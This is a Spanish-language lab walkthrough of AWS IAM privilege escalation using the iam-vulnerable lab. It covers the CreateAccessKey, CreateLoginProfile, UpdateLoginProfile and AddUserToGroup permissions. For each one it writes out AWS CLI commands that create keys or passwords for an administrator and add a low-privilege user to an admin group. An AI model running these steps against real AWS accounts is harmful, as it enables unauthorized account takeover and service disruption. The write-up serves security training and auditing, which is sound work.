---
description: 'Lab: IAM vulnerable'
---

# Permisos de IAM

La mayoría de los Administradores de AWS son conscientes de que los 4 permisos (<mark style="color:green;">IAM:CreateAccessKey IAM:CreateLoginProfile IAM:UpdateLoginProfile IAM:AddUserToGroup</mark>) son peligrosos de otorgar a cualquier usuario, ya que cada uno de ellos permite una forma de elevación de privilegios. En rara ocasiones, encontraremos políticas que permitan a un usuario con pocos privilegios cambiar explícitamente una contraseña para un usuario con muchos privilegios. Sin embargo, este tipo de configuraciones incorrectas ocurren, a menudo porque las políticas mal definidas tienen consecuencias inesperadas.

{% embed url="https://github.com/ramimac/aws-customer-security-incidents" %}

Un ejemplo sobre esta categoría es el uso de “listas negras” por medio de <mark style="color:green;">NotActions</mark>. Todos los permisos no incluidos en la lista negra están permitidos implícitamente.

<figure><img src="../../../.gitbook/assets/image (26) (1) (1).png" alt=""><figcaption></figcaption></figure>

El uso de una lista negra en lugar de un enfoque de lista blanca podría dejar la puerta abierta para que los usuarios aumenten sus privilegios.

A continuación se muestran ejemplos de elevación de privilegios con el uso de los permisos vulnerables de IAM&#x20;

## **IAM:CreateAccessKey**

Un atacante con el permiso <mark style="color:green;">**iam:CreateAccessKey**</mark> en otros usuarios puede crear un ID de clave de acceso y una clave de acceso secreta que pertenezca a otro usuario en el entorno de AWS.

{% hint style="danger" %}
Solamente con el privilegio <mark style="color:green;">**iam:CreateAccessKey**</mark> es posible realizar la explotación&#x20;
{% endhint %}

Laboratorio para probar este tipo de escalamiento:

{% embed url="https://github.com/BishopFox/iam-vulnerable" %}
Lab: IAM - Vulnerable | Escenario: privesc4
{% endembed %}

### Configuración inicial

Punto de entrada: privesc4-CreateAccessKey-user, con la siguientes políticas:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption><p>Políticas del usuario "privesc4-CreateAccessKey-user"</p></figcaption></figure>

Autenticar desde AWS CLI y configurar las llaves de acceso en terminal para realizar la explotación:

{% hint style="info" %}
Nota: con el `--profile <ProfileName>` permite crear nuevos perfiles para trabajar con diferentes cuentas, para este laboratorio de usara el perfil _privesc4_ y _lab1test_
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Enumeración

Siempre listar el whoiam:

```
aws sts get-caller-identity --profile privesc4
```

<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>

Listado del rol:

```bash
aws iam list-attached-user-policies --user-name privesc4-CreateAccessKey-user
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (3).png" alt=""><figcaption></figcaption></figure>

Listar las información de ARN de la política del usuario a auditar:

{% code overflow="wrap" %}
```bash
aws iam get-policy-version --policy-arn arn:aws:iam::num:policy/privesc4-CreateAccessKey --version-id v1
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (10) (2) (1).png" alt=""><figcaption></figcaption></figure>

### &#x20;Explotación

Si se intenta añadir al usuario directamente al grupo de administradores no se podrá, generará un error

{% code overflow="wrap" %}
```
aws iam add-user-to-group --group-name Group-Root-Admin --user-name privesc4-CreateAccessKey-user --profile privesc4
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (40) (1).png" alt=""><figcaption></figcaption></figure>

Pero como el usuario <mark style="color:green;">**privesc4-CreateAccessKey-user**</mark> tiene la política de crear llaves de acceso de cualquier usuario ("Resource" : "\*"), entonces se puede crear llaves para un usuario administrador:

{% code overflow="wrap" %}
```bash
aws iam create-access-key --user-name Administrator --profile privesc4
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Es importante saber el nombre del usuario a generar la llave en el parámetro `--user-name <Name>`

Se podrían conocer los usuarios por medio de enumeración de IAM o por algun diccionario.
{% endhint %}

Finalmente asumes el rol de administrador o el usuario comprometido:

<figure><img src="../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

Y utilizar el comando de `iam add-user-to-group` para añadir al usuario **privesc4-CreateAccessKey-user** al grupo de administradores con el perfil `--profile hack-admin`:

{% code overflow="wrap" %}
```
aws iam add-user-to-group --group-name Group-Root-Admin --user-name privesc4-CreateAccessKey-user --profile hack-admin
```
{% endcode %}

Siendo parte del grupo de administradores es game over.&#x20;



## IAM:CreateLoginProfile

Un atacante con el permiso **iam:CreateLoginProfile** en otros usuarios puede crear una contraseña para iniciar sesión en la consola de AWS en cualquier usuario que no tenga ya un perfil de inicio de sesión configurado.

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc5
{% endembed %}

### Configuración Inicial

Usuario de entrada: privesc5-CreateLoginProfile-user con la siguiente política:

<figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>

Configurar un perfil en AWS CLI

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
aws sts get-caller-identity --profile privesc5
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (2).png" alt=""><figcaption></figcaption></figure>

### Explotación

Como en el caso anterior, después de hacer enumeración y encontrar el usuario administrador o el usuario interesante a escalar y tomando en cuenta el permiso **iam:CreateLoginProfile**, se puede realizar el siguiente comando para generar una nueva contraseña:

{% code overflow="wrap" %}
```
aws iam create-login-profile --user-name <UserToHack> --password Password123! --no-password-reset-required --profile privesc5
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (36) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Si el usuario tiene doble factor de autenticación, este método de ataque no va a funcionar.
{% endhint %}

{% hint style="danger" %}
Con estos permisos, se puede cambiar la contraseña de cualquier usuario, generando una disrupción del servicio, se tiene que tener cuidado en auditorias.
{% endhint %}

Finalmente sabiendo la contraseña y la cuenta, para saber el ID de la cuenta o la cuenta **raíz** solo se toma del valor del comando `aws sts get-caller-identity` en el campo **"Account": "12 Dígitos":**

{% hint style="danger" %}
El **ID (12 dígitos)** de la cuenta raíz, es un valor sensible.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption><p>Login por web con usuario comprometido</p></figcaption></figure>

Con acceso al panel de administración web, es game over.

<figure><img src="../../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>



## IAM:UpdateLoginPorfile

Como el anterior caso, este permiso como su nombre indica, permite cambiar la contraseña utilizada para iniciar sesión en la consola web de AWS, para cualquier usuario que ya tenga un perfil de inicio de sesión configurado.

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc6
{% endembed %}

### Configuración Inicial

Usuario de entrada: privesc6-UpdateLoginProfile-user con la siguiente política:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>

Configurar Credenciales de acceso, ya sea creandolas desde la web como en los casos anteriores o desde un usuario administrador el siguiente comando:

{% code overflow="wrap" %}
```
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc6- UpdateLoginProfile-role --role-session-name privesc6
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>

Luego copiar el Access Key y el SecretAccessKey en `aws configure --profile privesc6`

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Explotación

Si se intenta agregar el usuario **privesc6** directamente al grupo de administradores local, generar un error:

{% code overflow="wrap" %}
```
aws iam add-user-to-group --group-name Group-Root- Spartan --user-name privesc6-UpdateLoginProfile-user -- profile privesc6
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Se tiene que hacer uso del permiso **update-login-profile** :&#x20;

{% code overflow="wrap" %}
```
aws iam update-login-profile --user-name Spartan- Administrador --password Password321! --no-password- reset-required --profile privesc6
```
{% endcode %}

{% hint style="danger" %}
Al realizar un cambio o actualización de la contraseña de cualquier usuario, puede generar una disrupción del servicio y generar una alerta.
{% endhint %}

Finalmente ingresar por medio web como el anterior caso

<figure><img src="../../../.gitbook/assets/image (3) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>



## IAM:AddUserToGroup

Un atacante con el permiso **iam:AddUserToGroup** puede utilizarlo para añadirse a un grupo IAM existente en la cuenta de AWS.

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc13
{% endembed %}

### Configuración Inicial

Usuario del laboratorio: privesc13-AddUserToGroup-user

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption><p>Permiso de añadir un usuario a cualquier grupo</p></figcaption></figure>

{% hint style="info" %}
Por sí solo, este permiso no es malo, se tiene que especificar a que grupo se puede añadir usuarios  ("Resource": "arn:sts:somegroup") y no dejar el permiso demasiado abierto ("Resource": "\*")
{% endhint %}



Como en los caso anteriores, se tiene que crear credenciales de acceso y configurar con `aws configure --profile privesc13`

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### Explotación

La explotación de este caso es bastante sencilla, se busca enumerar los grupos existentes y proceder a añadirse a si mismo al grupo seleccionado, por ejemplo el grupo de administradores locales:

{% code overflow="wrap" %}
```
aws iam add-user-to-group --group-name Group-Root- Spartan --user-name privesc13-AddUserToGroup-user -- profile privesc13
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>







